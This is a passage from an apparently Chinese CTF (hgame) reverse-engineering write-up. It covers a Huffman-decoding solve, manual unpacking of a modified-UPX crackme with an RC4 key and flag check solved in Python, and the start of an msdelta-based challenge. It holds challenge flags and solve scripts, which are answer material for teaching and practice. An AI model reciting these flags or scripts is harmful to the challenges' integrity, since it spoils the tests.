class="string">&#x27;&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:125&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:119&#125;,&quot;b&quot;:&#123;&quot;s&quot;:123&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:104&#125;,&quot;b&quot;:&#123;&quot;s&quot;:105&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:101&#125;,&quot;b&quot;:&#123;&quot;s&quot;:103&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:10&#125;,&quot;b&quot;:&#123;&quot;s&quot;:13&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:32&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:115&#125;,&quot;b&quot;:&#123;&quot;s&quot;:116&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:46&#125;,&quot;b&quot;:&#123;&quot;s&quot;:48&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:76&#125;,&quot;b&quot;:&#123;&quot;s&quot;:78&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:83&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:68&#125;,&quot;b&quot;:&#123;&quot;s&quot;:69&#125;&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:44&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:33&#125;,&quot;b&quot;:&#123;&quot;s&quot;:38&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:45&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:100&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:98&#125;,&quot;b&quot;:&#123;&quot;s&quot;:99&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:49&#125;,&quot;b&quot;:&#123;&quot;s&quot;:51&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:97&#125;&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:117&#125;,&quot;b&quot;:&#123;&quot;s&quot;:118&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:112&#125;,&quot;b&quot;:&#123;&quot;s&quot;:113&#125;&#125;,&quot;b&quot;:&#123;&quot;s&quot;:114&#125;&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:108&#125;,&quot;b&quot;:&#123;&quot;s&quot;:109&#125;&#125;,&quot;b&quot;:&#123;&quot;a&quot;:&#123;&quot;s&quot;:110&#125;,&quot;b&quot;:&#123;&quot;s&quot;:111&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span> </span><br><span class="line">    tree = json.loads(json_data)</span><br><span class="line">    encoded_str = <span class="string">&quot;00010001110111111010010000011100010111000100111000110000100010111001110010011011010101111011101100110100011101101001110111110111011011001110110011110011110110111011101101011001111011001111000111001101111000011001100001011011101100011100101001110010111001111000011000101001010000000100101000100010011111110110010111010101000111101000110110001110101011010011111111001111111011010101100001101110101101111110100100111100100010110101111111111100110001010101101110010011111000110110101101111010000011110100000110110101011000111111000110101001011100000110111100000010010100010001011100011100111001011101011111000101010110101111000001100111100011100101110101111100010110101110000010100000010110001111011100011101111110101010010011101011100100011110010010110111101110111010111110110001111010101110010001011100100101110001011010100001110101000101111010100110001110101011101100011011011000011010000001011000111011111111100010101011100000&quot;</span> </span><br><span class="line">    huffman_tree_dict = parse_tree(tree)</span><br><span class="line">    flag = decode_huffman(encoded_str, huffman_tree_dict)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br></pre></td></tr></table></figure>
<p>得到flag：<font color=deepskyblue><strong>hgame{Nu-Shell-scr1pts-ar3-1nt3r3st1ng-t0-wr1te-&amp;-use!}</strong></font>.</p>
<h3 id="Turtle："><a href="#Turtle：" class="headerlink" title="Turtle："></a>Turtle：</h3><p>查壳发现了魔改UPX，发现不仅UPX头改了，0x25字节的自加密数据也全抹光了，直接x64dbg+Scylla手脱UPX，之后ida分析，找到main函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_401876</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">256</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">48</span>]; <span class="comment">// [rsp+120h] [rbp+A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Buf1[<span class="number">46</span>]; <span class="comment">// [rsp+150h] [rbp+D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Buf2[<span class="number">5</span>]; <span class="comment">// [rsp+17Eh] [rbp+FEh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">2</span>]; <span class="comment">// [rsp+183h] [rbp+103h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 Source[<span class="number">8</span>]; <span class="comment">// [rsp+185h] [rbp+105h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 Dest[<span class="number">8</span>]; <span class="comment">// [rsp+18Dh] [rbp+10Dh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">11</span>]; <span class="comment">// [rsp+195h] [rbp+115h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [rsp+1A0h] [rbp+120h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+1A4h] [rbp+124h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+1A8h] [rbp+128h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// [rsp+1ACh] [rbp+12Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_401C20();</span><br><span class="line">  <span class="built_in">strcpy</span>(v8, <span class="string">&quot;yekyek&quot;</span>);</span><br><span class="line">  Buf2[<span class="number">0</span>] = <span class="number">-51</span>;</span><br><span class="line">  Buf2[<span class="number">1</span>] = <span class="number">-113</span>;</span><br><span class="line">  Buf2[<span class="number">2</span>] = <span class="number">37</span>;</span><br><span class="line">  Buf2[<span class="number">3</span>] = <span class="number">61</span>;</span><br><span class="line">  Buf2[<span class="number">4</span>] = <span class="number">-31</span>;</span><br><span class="line">  qmemcpy(v5, <span class="string">&quot;QJ&quot;</span>, <span class="keyword">sizeof</span>(v5)); <span class="comment">//这里QJ也是key的一部分</span></span><br><span class="line">  v2[<span class="number">0</span>] = <span class="number">-8</span>;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="number">-43</span>;</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="number">98</span>;</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="number">-49</span>;</span><br><span class="line">  v2[<span class="number">4</span>] = <span class="number">67</span>;</span><br><span class="line">  v2[<span class="number">5</span>] = <span class="number">-70</span>;</span><br><span class="line">  v2[<span class="number">6</span>] = <span class="number">-62</span>;</span><br><span class="line">  v2[<span class="number">7</span>] = <span class="number">35</span>;</span><br><span class="line">  v2[<span class="number">8</span>] = <span class="number">21</span>;</span><br><span class="line">  v2[<span class="number">9</span>] = <span class="number">74</span>;</span><br><span class="line">  v2[<span class="number">10</span>] = <span class="number">81</span>;</span><br><span class="line">  v2[<span class="number">11</span>] = <span class="number">16</span>;</span><br><span class="line">  v2[<span class="number">12</span>] = <span class="number">39</span>;</span><br><span class="line">  v2[<span class="number">13</span>] = <span class="number">16</span>;</span><br><span class="line">  v2[<span class="number">14</span>] = <span class="number">-79</span>;</span><br><span class="line">  v2[<span class="number">15</span>] = <span class="number">-49</span>;</span><br><span class="line">  v2[<span class="number">16</span>] = <span class="number">-60</span>;</span><br><span class="line">  v2[<span class="number">17</span>] = <span class="number">9</span>;</span><br><span class="line">  v2[<span class="number">18</span>] = <span class="number">-2</span>;</span><br><span class="line">  v2[<span class="number">19</span>] = <span class="number">-29</span>;</span><br><span class="line">  v2[<span class="number">20</span>] = <span class="number">-97</span>;</span><br><span class="line">  v2[<span class="number">21</span>] = <span class="number">73</span>;</span><br><span class="line">  v2[<span class="number">22</span>] = <span class="number">-121</span>;</span><br><span class="line">  v2[<span class="number">23</span>] = <span class="number">-22</span>;</span><br><span class="line">  v2[<span class="number">24</span>] = <span class="number">89</span>;</span><br><span class="line">  v2[<span class="number">25</span>] = <span class="number">-62</span>;</span><br><span class="line">  v2[<span class="number">26</span>] = <span class="number">7</span>;</span><br><span class="line">  v2[<span class="number">27</span>] = <span class="number">59</span>;</span><br><span class="line">  v2[<span class="number">28</span>] = <span class="number">-87</span>;</span><br><span class="line">  v2[<span class="number">29</span>] = <span class="number">17</span>;</span><br><span class="line">  v2[<span class="number">30</span>] = <span class="number">-63</span>;</span><br><span class="line">  v2[<span class="number">31</span>] = <span class="number">-68</span>;</span><br><span class="line">  v2[<span class="number">32</span>] = <span class="number">-3</span>;</span><br><span class="line">  v2[<span class="number">33</span>] = <span class="number">75</span>;</span><br><span class="line">  v2[<span class="number">34</span>] = <span class="number">87</span>;</span><br><span class="line">  v2[<span class="number">35</span>] = <span class="number">-60</span>;</span><br><span class="line">  v2[<span class="number">36</span>] = <span class="number">126</span>;</span><br><span class="line">  v2[<span class="number">37</span>] = <span class="number">-48</span>;</span><br><span class="line">  v2[<span class="number">38</span>] = <span class="number">-86</span>;</span><br><span class="line">  v2[<span class="number">39</span>] = <span class="number">10</span>;</span><br><span class="line">  v12 = <span class="number">6</span>;</span><br><span class="line">  v11 = <span class="number">7</span>;</span><br><span class="line">  v10 = <span class="number">40</span>;</span><br><span class="line">  j_printf(<span class="string">&quot;plz input the key: &quot;</span>);</span><br><span class="line">  j_scanf(<span class="string">&quot;%s&quot;</span>, Source);</span><br><span class="line">  j__mbscpy(Dest, Source);</span><br><span class="line">  v9 = <span class="number">7</span>;</span><br><span class="line">  sub_401550(v8, v12, v1); <span class="comment">//RC4，KSA部分</span></span><br><span class="line">  sub_40163E(Source, v9, v1); <span class="comment">//RC4，PRGA部分</span></span><br><span class="line">  <span class="keyword">if</span> ( !j_memcmp(Source, Buf2, v11) ) <span class="comment">//比较key</span></span><br><span class="line">  &#123;</span><br><span class="line">    j_printf(<span class="string">&quot;plz input the flag: &quot;</span>);</span><br><span class="line">    j_scanf(<span class="string">&quot;%s&quot;</span>, Buf1);</span><br><span class="line">    *(_DWORD *)&amp;v8[<span class="number">7</span>] = <span class="number">40</span>;</span><br><span class="line">    sub_401550(Dest, v9, v1); <span class="comment">//RC4，KSA部分</span></span><br><span class="line">    sub_40175A(Buf1, *(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v8[<span class="number">7</span>], v1); <span class="comment">//RC4，PRGA部分</span></span><br><span class="line">    <span class="keyword">if</span> ( !j_memcmp(Buf1, v2, v10) ) <span class="comment">//比较flag</span></span><br><span class="line">      j_puts(Buffer);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      j_puts(aWrongPlzTryAga);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    j_puts(aKeyIsWrong);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先看key的部分：先用密钥<code>yekyek</code>作为RC4的KSA部分生成S盒，然后加密输入值，之后再与Buf2密文进行比较，这里Buf2为<font color=lime><strong>[0xCD, 0x8F, 0x25, 0x3D, 0xE1, Q, J]</strong></font>，解密得到<font color=LimeGreen><strong>[0x65, 0x63, 0x67, 0x34, 0x61, 0x62, 0x36]</strong></font>，即key为<code>ecg4ab6</code>，接着查看flag，发现flag所用的PRGA部分略有不同，不过仅仅是改为了减号，则解密函数只需改成加号，又有flag密文为<font color=orange><strong>[0xf8, 0xd5, 0x62, 0xcf, 0x43, 0xba, 0xc2, 0x23, 0x15, 0x4a, 0x51, 0x10, 0x27, 0x10, 0xb1, 0xcf, 0xc4, 0x9, 0xfe, 0xe3, 0x9f, 0x49, 0x87, 0xea, 0x59, 0xc2, 0x7, 0x3b, 0xa9, 0x11, 0xc1, 0xbc, 0xfd, 0x4b, 0x57, 0xc4, 0x7e, 0xd0, 0xaa, 0xa]</strong></font>，解得flag为：<font color=deepskyblue><strong>hgame{Y0u’r3_re4l1y_g3t_0Ut_of_th3_upX!}</strong></font>.</p>
<p>解题脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_ksa</span>(<span class="params">key</span>):</span><br><span class="line">    sbox = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + sbox[i] + key[i % <span class="built_in">len</span>(key)]) % <span class="number">256</span></span><br><span class="line">        sbox[i], sbox[j] = sbox[j], sbox[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(<span class="string">f&#x27;0x<span class="subst">&#123;byte:02X&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> sbox)&#125;</span>]&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> sbox</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_prga</span>(<span class="params">s, data</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        data[k] ^= s[t]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_enc</span>(<span class="params">s, data</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        data[k] -= s[t]</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_dec</span>(<span class="params">s, data</span>):</span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        data[k] = (data[k] + s[t]) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># key = &quot;yekyek&quot;.encode()</span></span><br><span class="line">key = <span class="string">&quot;ecg4ab6&quot;</span>.encode()</span><br><span class="line"><span class="comment">#plaintext = b&quot;\xCD\x8F\x25\x3D\xE1QJ&quot;</span></span><br><span class="line">plaintext = <span class="string">b&quot;\xf8\xd5\x62\xcf\x43\xba\xc2\x23\x15\x4a\x51\x10\x27\x10\xb1\xcf\xc4\x09\xfe\xe3\x9f\x49\x87\xea\x59\xc2\x07\x3b\xa9\x11\xc1\xbc\xfd\x4b\x57\xc4\x7e\xd0\xaa\x0a&quot;</span> </span><br><span class="line">sbox = rc4_ksa(key)</span><br><span class="line"><span class="comment"># ciphertext = rc4_prga(sbox.copy(), bytearray(plaintext))</span></span><br><span class="line">ciphertext = rc4_dec(sbox.copy(), <span class="built_in">bytearray</span>(plaintext))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;<span class="string">&#x27;, &#x27;</span>.join(<span class="string">f&#x27;0x<span class="subst">&#123;byte:02X&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> ciphertext)&#125;</span>]&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Delta-Erro0000ors："><a href="#Delta-Erro0000ors：" class="headerlink" title="Delta Erro0000ors："></a>Delta Erro0000ors：</h3><p>观察主函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  HMODULE LibraryA; <span class="comment">// rax</span></span><br><span class="line">  DWORD LastError; <span class="comment">// eax</span></span><br><span class="line">  __int128 v6; <span class="comment">// [rsp+20h] [rbp-138h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-128h]</span></span><br><span class="line">  __int128 v8; <span class="comment">// [rsp+38h] [rbp-120h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+48h] [rbp-110h]</span></span><br><span class="line">  __int128 v10; <span class="comment">// [rsp+50h] [rbp-108h] BYREF</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+60h] [rbp-F8h]</span></span><br><span class="line">  __int128 v12; <span class="comment">// [rsp+70h] [rbp-E8h] BYREF</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+80h] [rbp-D8h]</span></span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">16</span>]; <span class="comment">// [rsp+90h] [rbp-C8h] BYREF</span></span><br><span class="line">  __int128 v15; <span class="comment">// [rsp+A0h] [rbp-B8h]</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// [rsp+B0h] [rbp-A8h]</span></span><br><span class="line">  <span class="type">char</span> v17; <span class="comment">// [rsp+B4h] [rbp-A4h]</span></span><br><span class="line">  <span class="type">char</span> Buffer[<span class="number">16</span>]; <span class="comment">// [rsp+B8h] [rbp-A0h]</span></span><br><span class="line">  __int128 v19; <span class="comment">// [rsp+C8h] [rbp-90h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+D8h] [rbp-80h]</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">16</span>]; <span class="comment">// [rsp+E0h] [rbp-78h] BYREF</span></span><br><span class="line">  __int128 v22; <span class="comment">// [rsp+F0h] [rbp-68h]</span></span><br><span class="line">  __int128 v23; <span class="comment">// [rsp+100h] [rbp-58h]</span></span><br><span class="line">  __int128 v24; <span class="comment">// [rsp+110h] [rbp-48h]</span></span><br><span class="line">  __int128 v25; <span class="comment">// [rsp+120h] [rbp-38h]</span></span><br><span class="line">  __int128 v26; <span class="comment">// [rsp+130h] [rbp-28h]</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [rsp+140h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  LibraryA = LoadLibraryA(<span class="string">&quot;msdelta.dll&quot;</span>); <span class="comment">//加载了msdelta.dll并加载了ApplyDeltaB和DeltaFree两个函数</span></span><br><span class="line">  ::LibraryA = LibraryA;</span><br><span class="line">  <span class="keyword">if</span> ( LibraryA )</span><br><span class="line">  &#123;</span><br><span class="line">    ApplyDeltaB = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD))GetProcAddress(LibraryA, <span class="string">&quot;ApplyDeltaB&quot;</span>);</span><br><span class="line">    DeltaFree = (BOOL (__stdcall *)(LPVOID))GetProcAddress(::LibraryA, <span class="string">&quot;DeltaFree&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;LoadLibrary Error&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  *(_OWORD *)Str1 = <span class="number">0</span>i64;</span><br><span class="line">  v22 = <span class="number">0</span>i64;</span><br><span class="line">  v23 = <span class="number">0</span>i64;</span><br><span class="line">  v24 = <span class="number">0</span>i64;</span><br><span class="line">  v25 = <span class="number">0</span>i64;</span><br><span class="line">  v26 = <span class="number">0</span>i64;</span><br><span class="line">  v27 = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)Destination = <span class="number">0</span>i64;</span><br><span class="line">  v15 = <span class="number">0</span>i64;</span><br><span class="line">  v16 = <span class="number">0</span>;</span><br><span class="line">  v17 = <span class="number">0</span>;</span><br><span class="line">  *(_OWORD *)Buffer = <span class="number">0</span>i64;</span><br><span class="line">  v19 = <span class="number">0</span>i64;</span><br><span class="line">  v20 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input your flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%43s&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(Str1, <span class="string">&quot;hgame&#123;&quot;</span>, <span class="number">6u</span>i64) &amp;&amp; BYTE10(v23) == <span class="number">125</span> ) <span class="comment">//flag长43位，只有符合格式才进行后续流程，否则直接输出great</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strncpy</span>(Destination, &amp;Str1[<span class="number">6</span>], <span class="number">0x24u</span>i64);</span><br><span class="line">    LODWORD(v9) = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)&amp;v8 = Destination;</span><br><span class="line">    *((_QWORD *)&amp;v8 + <span class="number">1</span>) = <span class="number">37</span>i64;</span><br><span class="line">    LODWORD(v7) = <span class="number">0</span>;</span><br><span class="line">    *(_QWORD *)&amp;v6 = &amp;unk_1400050A0;</span><br><span class="line">    *((_QWORD *)&amp;v6 + <span class="number">1</span>) = <span class="number">69</span>i64;</span><br><span class="line">    v10 = v6;</span><br><span class="line">    v11 = v7;</span><br><span class="line">    v12 = v8;</span><br><span class="line">    v13 = v9;</span><br><span class="line">    <span class="keyword">if</span> ( ApplyDeltaB(<span class="number">0</span>i64, &amp;v12, &amp;v10, &amp;qword_140005190) ) <span class="comment">//调试发现这里ApplyDelta一定会出错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;ApplyDelta Error&quot;</span>);</span><br><span class="line">      LastError = GetLastError();</span><br><span class="line">      RaiseException(LastError, <span class="number">1u</span>, <span class="number">0</span>, <span class="number">0</span>i64); <span class="comment">//进入异常处理</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(aGreat); <span class="comment">//flag正确或不符合格式</span></span><br><span class="line">  DeltaFree((LPVOID)qword_140005190);</span><br><span class="line">  FreeLibrary(::LibraryA);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>异常处理的部分没有反编译成C语言代码，汇编如下：</p>
